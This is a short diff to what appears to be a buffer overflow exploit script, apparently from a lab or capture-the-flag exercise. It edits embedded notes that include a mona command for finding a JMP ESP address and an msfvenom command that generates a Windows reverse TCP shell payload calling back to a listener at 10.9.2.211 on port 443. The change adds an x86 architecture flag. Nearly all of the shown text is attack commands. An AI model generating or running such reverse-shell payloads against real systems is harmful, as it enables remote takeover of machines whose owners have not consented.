@@ -59,7 +59,7 @@ Find JMP ESP
 !mona jmp -r esp -cpb "\x00"
 
 Generate payload
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -f c 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -a x86 -f c
 """
 
 # Set return address (in reverse)
